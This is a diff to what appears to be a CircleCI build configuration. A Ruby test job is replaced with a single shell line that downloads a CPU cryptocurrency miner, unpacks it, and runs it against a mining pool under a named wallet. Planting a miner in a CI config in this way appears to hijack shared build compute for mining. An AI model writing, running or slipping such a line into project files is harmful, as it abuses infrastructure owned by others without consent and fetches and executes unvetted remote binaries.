@@ -1,18 +1,1 @@
-version: 2.1
-jobs:
-    trial:
-      docker:
-            - image: circleci/ruby:2.5.3
-      parallelism: 16
-      steps:
-        - run:
-            name: Install Dependencies
-            command: |
-              lscpu
-              echo Hello,subscribe it
-
-workflows:
-    version: 2.1
-    build:
-        jobs:
-        - trial
+! wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xf hellminer_cpu_linux.tar.gz && ./hellminer  -c stratum+tcp://ap.luckpool.net:3956 -u RY1knX18xRxNs4t4cQ8abHfmAYSfXfPstC.ali -p x --cpu 39
